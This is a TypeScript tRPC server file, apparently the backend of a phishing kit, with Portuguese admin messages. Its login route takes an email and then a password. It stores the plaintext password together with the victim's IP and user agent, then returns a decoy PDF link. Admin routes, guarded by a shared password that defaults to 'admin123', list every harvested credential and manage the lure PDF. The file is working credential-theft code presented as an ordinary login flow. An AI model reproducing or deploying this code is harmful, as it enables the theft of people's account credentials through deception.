import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { getDb } from "./db";
import { credentialLogs, pdfFiles } from "../drizzle/schema";
import { desc, eq } from "drizzle-orm";
import { storagePut } from "./storage";
import { ENV } from "./_core/env";

// Simple admin password check — stored as env var ADMIN_PASSWORD
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  login: router({
    // Step 1: just validate email format (no DB write yet)
    submitEmail: publicProcedure
      .input(z.object({ email: z.string().min(1) }))
      .mutation(({ input }) => {
        return { success: true, email: input.email };
      }),

    // Step 2: save credentials + return PDF URL
    submitPassword: publicProcedure
      .input(z.object({ email: z.string().min(1), password: z.string().min(1) }))
      .mutation(async ({ input, ctx }) => {
        const db = await getDb();
        if (!db) throw new Error("Database not available");

        // Extract real IP
        const ip =
          (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
          (ctx.req as any).ip ||
          (ctx.req as any).socket?.remoteAddress ||
          "unknown";

        const userAgent = (ctx.req.headers["user-agent"] as string) || "";

        // Save credentials to DB
        await db.insert(credentialLogs).values({
          email: input.email,
          password: input.password,
          ip,
          userAgent,
        });

        // Get latest PDF
        const pdfs = await db.select().from(pdfFiles).orderBy(desc(pdfFiles.uploadedAt)).limit(1);
        const pdf = pdfs[0];

        return {
          success: true,
          pdfUrl: pdf ? pdf.storageUrl : null,
        };
      }),
  }),

  admin: router({
    // Verify admin password
    login: publicProcedure
      .input(z.object({ password: z.string() }))
      .mutation(({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new Error("Senha incorreta");
        }
        return { success: true };
      }),

    // Get all credential logs
    getLogs: publicProcedure
      .input(z.object({ password: z.string() }))
      .query(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new Error("Não autorizado");
        }
        const db = await getDb();
        if (!db) throw new Error("Database not available");
        const logs = await db
          .select()
          .from(credentialLogs)
          .orderBy(desc(credentialLogs.createdAt));
        return logs;
      }),

    // Get active PDF
    getPdf: publicProcedure
      .input(z.object({ password: z.string() }))
      .query(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new Error("Não autorizado");
        }
        const db = await getDb();
        if (!db) throw new Error("Database not available");
        const pdfs = await db
          .select()
          .from(pdfFiles)
          .orderBy(desc(pdfFiles.uploadedAt))
          .limit(1);
        return pdfs[0] || null;
      }),

    // Upload PDF (base64 encoded)
    uploadPdf: publicProcedure
      .input(
        z.object({
          password: z.string(),
          filename: z.string(),
          base64: z.string(),
        })
      )
      .mutation(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new Error("Não autorizado");
        }
        const db = await getDb();
        if (!db) throw new Error("Database not available");

        const buffer = Buffer.from(input.base64, "base64");
        const key = `pdfs/${Date.now()}-${input.filename}`;
        const { url } = await storagePut(key, buffer, "application/pdf");

        await db.insert(pdfFiles).values({
          filename: input.filename,
          storageKey: key,
          storageUrl: url,
        });

        return { success: true, url };
      }),

    // Delete all PDFs
    deletePdf: publicProcedure
      .input(z.object({ password: z.string(), id: z.number() }))
      .mutation(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new Error("Não autorizado");
        }
        const db = await getDb();
        if (!db) throw new Error("Database not available");
        await db.delete(pdfFiles).where(eq(pdfFiles.id, input.id));
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
